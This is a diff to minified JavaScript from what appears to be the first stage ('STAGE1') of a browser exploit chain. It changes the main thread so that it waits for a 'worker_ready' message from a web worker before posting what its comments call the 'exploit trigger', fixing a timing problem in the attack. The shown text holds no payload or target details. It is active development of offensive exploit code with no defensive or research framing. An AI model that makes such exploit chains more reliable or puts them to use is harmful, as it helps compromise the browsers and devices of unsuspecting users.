@@ -1131,7 +1131,17 @@ async function q(t, e) {
           window.log("[STAGE1] h.onmessage fired with type=" + msgType);
           if (t.data.type === n) {
             // type 0 - debug message from worker
-            window.log("[STAGE1] WORKER: " + (t.data.msg || ""));
+            const msg = t.data.msg || "";
+            window.log("[STAGE1] WORKER: " + msg);
+            // If worker is ready, send the exploit trigger
+            if (msg === "worker_ready") {
+              window.log("[STAGE1] Worker is ready, sending exploit trigger (type=" + s + ")");
+              h.postMessage({
+                type: s,
+                xn: l
+              });
+              window.log("[STAGE1] Exploit trigger sent to worker");
+            }
           } else if (t.data.type === r) {
             window.log("[STAGE1] h.onmessage type=r, calling a()");
             o("");
@@ -1143,12 +1153,7 @@ async function q(t, e) {
             window.setTimeout(u, 0);
           }
         };
-        window.log("[STAGE1] a() - about to postMessage with type=" + s);
-        h.postMessage({
-          type: s,
-          xn: l
-        });
-        window.log("[STAGE1] a() - postMessage sent, waiting for worker response");
+        window.log("[STAGE1] a() - about to set up message handlers");
       } catch (err) {
         window.log("[STAGE1 ERROR] a() exception: " + (err && err.message));
         throw err;
@@ -1501,6 +1506,10 @@ async function q(t, e) {
           } catch (e) {}
         }
       };
+      // Signal that worker is ready to receive messages
+      try {
+        self.postMessage({ type: 0, msg: "worker_ready" });
+      } catch (e) {}
     } catch (err) {
       try {
         self.postMessage({ type: 0, msg: "worker_setup_error: " + err.message });
